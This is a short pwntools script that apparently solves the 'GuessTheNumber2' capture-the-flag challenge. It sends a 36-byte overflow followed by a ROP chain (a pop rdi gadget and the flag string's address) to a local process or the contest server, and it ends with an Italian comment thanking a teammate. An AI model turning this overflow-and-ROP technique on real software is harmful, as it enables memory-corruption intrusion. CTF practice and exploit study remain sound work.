from pwn import *

elf = context.binary = ELF('./GuessTheNumber2')
libc = ELF('./GuessTheNumber2')
context.terminal = ['tmux', 'splitw', '-h']
if args.REMOTE:
    conn = remote("gtn2.challs.olicyber.it", 10023)
elif args.GDB:
    conn = gdb.debug([elf.path], gdbscript='''
    b main
    c        
    ''')
else:
    conn = elf.process()

conn.recvuntil(b"scores:")
#conn.send(cyclic(0x80)

buff = 36

flag = elf.search(b'flag').__next__()

POP_RDI = 0x401803
p = b'\x00'*36 + flat([
    0x0000000000401803,
    flag,
    0x401608
])
conn.sendline(p)
conn.recv()
conn.sendline(b'1')

conn.interactive()


# DIO MERD A GRAZIE ENEA PER LA SOLVE, QUESTA FUNZIONA GRAZIE A TE BUBU